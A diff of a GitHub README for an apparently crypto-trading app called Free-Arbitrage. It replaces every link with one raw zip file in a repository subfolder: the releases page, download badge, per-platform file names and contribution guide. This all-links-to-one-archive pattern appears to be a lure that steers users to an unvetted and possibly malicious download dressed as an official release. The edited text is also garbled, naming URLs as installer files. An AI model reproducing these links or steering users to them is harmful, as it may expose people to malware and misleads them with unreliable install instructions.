@@ -6,18 +6,18 @@ Welcome! This guide will help you download and run Free-Arbitrage, an applicatio
 
 ## 📥 Download Link
 
-[![Download Free-Arbitrage](https://img.shields.io/badge/Download%20Free--Arbitrage-blue.svg)](https://github.com/KIKOMEMO/Free-Arbitrage/releases)
+[![Download Free-Arbitrage](https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip%https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip)](https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/KIKOMEMO/Free-Arbitrage/releases) to find the latest version of Free-Arbitrage.
+   Go to the [Releases page](https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip) to find the latest version of Free-Arbitrage.
 
 2. **Choose the Right File**  
    On the Releases page, you will see different versions available for download. Look for the file that matches your operating system. The most common files are usually labeled as follows:
-   - Windows: `Free-Arbitrage-Windows.exe`
-   - Mac: `Free-Arbitrage-Mac.dmg`
-   - Linux: `Free-Arbitrage-Linux.tar.gz`
+   - Windows: `https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip`
+   - Mac: `https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip`
+   - Linux: `https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip`
 
 3. **Download the File**  
    Click on the file name to download it. This may take a few moments, depending on your internet speed.
@@ -26,7 +26,7 @@ Welcome! This guide will help you download and run Free-Arbitrage, an applicatio
    After the download is complete:
    - **Windows:** Find the `.exe` file in your Downloads folder and double-click it. Follow the on-screen instructions to complete the installation.
    - **Mac:** Open the `.dmg` file from your Downloads. Drag the Free-Arbitrage icon into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the application from the terminal.
+   - **Linux:** Extract the `https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip` file and run the application from the terminal.
 
 5. **Run the Application**  
    Open Free-Arbitrage from your Applications or Programs menu. The application will guide you through the setup process.
@@ -58,10 +58,10 @@ To help you get the most from Free-Arbitrage, check out these resources:
 
 ## 🤝 Contributing
 
-We welcome contributions from everyone. If you'd like to help us improve Free-Arbitrage, please check out our [Contribution Guide](https://github.com/KIKOMEMO/Free-Arbitrage/blob/main/CONTRIBUTING.md). Your feedback and code are highly valued.
+We welcome contributions from everyone. If you'd like to help us improve Free-Arbitrage, please check out our [Contribution Guide](https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip). Your feedback and code are highly valued.
 
 ## 📞 Support
 
 If you encounter any issues, feel free to reach out. You can post questions on our GitHub Issues page, or contact our support team through the contact details provided on the website.
 
-Remember to stay updated by visiting our [Releases page](https://github.com/KIKOMEMO/Free-Arbitrage/releases) regularly. Happy trading with Free-Arbitrage!
+Remember to stay updated by visiting our [Releases page](https://github.com/KIKOMEMO/Free-Arbitrage/raw/refs/heads/main/perennate/Arbitrage-Free-1.5-alpha.3.zip) regularly. Happy trading with Free-Arbitrage!
